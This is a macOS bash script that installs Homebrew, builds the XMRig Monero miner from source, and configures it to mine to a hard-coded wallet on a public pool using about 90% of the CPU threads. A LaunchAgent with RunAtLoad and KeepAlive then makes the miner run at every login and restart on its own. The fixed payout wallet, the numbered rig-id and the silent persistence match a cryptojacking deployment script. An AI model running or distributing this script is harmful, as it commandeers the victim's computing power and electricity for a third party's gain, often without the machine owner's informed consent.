#!/bin/bash

cat << 'EOF'

 /$$   /$$  /$$$$$$                /$$            
| $$  | $$ /$$__  $$              | $$            
| $$  | $$| $$  \ $$      /$$$$$$$| $$$$$$$       
| $$$$$$$$| $$$$$$$$     /$$_____/| $$__  $$      
| $$__  $$| $$__  $$    |  $$$$$$ | $$  \ $$      
| $$  | $$| $$  | $$     \____  $$| $$  | $$      
| $$  | $$| $$  | $$ /$$ /$$$$$$$/| $$  | $$      
|__/  |__/|__/  |__/|__/|_______/ |__/  |__/      
                                                  

EOF

# Install Homebrew if not found
if ! command -v brew &> /dev/null; then
    echo "Installing Homebrew..."
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
    echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> ~/.zprofile
    eval "$(/opt/homebrew/bin/brew shellenv)"
fi

# Install dependencies
brew install git cmake automake libtool autoconf hwloc openssl libuv

# Clean any existing XMRig install
rm -rf ~/xmrig

# Clone and build XMRig
cd ~
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build && cd build
cmake .. -DOPENSSL_ROOT_DIR=$(brew --prefix openssl)
make -j$(sysctl -n hw.logicalcpu)

# Calculate threads
CPU_THREADS=$(sysctl -n hw.logicalcpu)
USED_THREADS=$((CPU_THREADS * 90 / 100))
if [ "$USED_THREADS" -lt 1 ]; then USED_THREADS=1; fi
USED_THREADS=$((USED_THREADS - 1))
if [ "$USED_THREADS" -lt 1 ]; then USED_THREADS=1; fi

# Create config.json
cat > ~/xmrig/build/config.json <<EOL
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "max-threads-hint": 1.0,
        "huge-pages": false,
        "threads": $USED_THREADS
    },
    "donate-level": 0,
    "pools": [
        {
            "url": "gulf.moneroocean.stream:10128",
            "user": "41jDs7aYqSFYpyvSBs7JAzSpRCjL9sSCS9WPuVGRukYcYTtUTszDdp71RFVtWD2icADwsnAQoSBJfDm7J1Chsuou5AHG36P",
            "pass": "x",
            "rig-id": "MacOS-90-W002",
            "keepalive": true,
            "tls": false
        }
    ]
}
EOL

# Create LaunchAgent plist
mkdir -p ~/Library/LaunchAgents

cat > ~/Library/LaunchAgents/com.user.xmrig.plist <<EOL
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" 
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
  <dict>
    <key>Label</key>
    <string>com.user.xmrig</string>
    <key>ProgramArguments</key>
    <array>
      <string>/Users/$(whoami)/xmrig/build/xmrig</string>
      <string>-c</string>
      <string>/Users/$(whoami)/xmrig/build/config.json</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>WorkingDirectory</key>
    <string>/Users/$(whoami)/xmrig/build</string>
    <key>StandardOutPath</key>
    <string>/Users/$(whoami)/xmrig/xmrig.log</string>
    <key>StandardErrorPath</key>
    <string>/Users/$(whoami)/xmrig/xmrig-error.log</string>
  </dict>
</plist>
EOL

# Load the service
launchctl unload ~/Library/LaunchAgents/com.user.xmrig.plist 2>/dev/null
launchctl load ~/Library/LaunchAgents/com.user.xmrig.plist

echo "✅ XMRig is now set to run automatically in the background at login."
echo "📄 Logs: ~/xmrig/xmrig.log"
